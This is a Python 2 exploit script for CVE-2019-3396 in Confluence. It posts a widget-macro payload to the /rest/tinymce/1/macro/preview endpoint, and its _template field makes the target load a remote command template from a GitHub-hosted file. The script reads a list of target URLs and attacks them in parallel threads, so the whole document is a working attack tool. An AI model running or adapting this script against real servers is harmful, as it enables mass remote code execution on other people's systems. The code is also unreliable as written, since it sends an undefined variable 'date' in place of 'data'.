#!/usr/bin/env python
# -*- coding: utf-8 -*-
import ssl
import urllib2
import threading


def CVE_2019_3396(url,cmd):
    url = url if '://' in url else 'http://' + url
    filename = "https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm"
    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; win x86_64; rv:60.0) Gecko/2323 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"http://www.dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"%s","cmd":"%s"}}}' % (filename,cmd)
    try :
        requests = urllib2.Request(paylaod, data = date , headers = headers)
        res = urllib2.urlopen(requests,timeout=3)
    except:
        return ""



def thread_go(url,cmd):
    thd = threading.Thread(target=CVE_2019_3396,args=(url,cmd))
    thd.start()
    while True:
        if(len(threading.enumerate()) < 30):
            break
    pass
    
if __name__ == '__main__':
    with open('3396.txt','r') as f:
        urls = f.read().splitlines()
        for url in urls:
            thread_go(url.strip(),"")

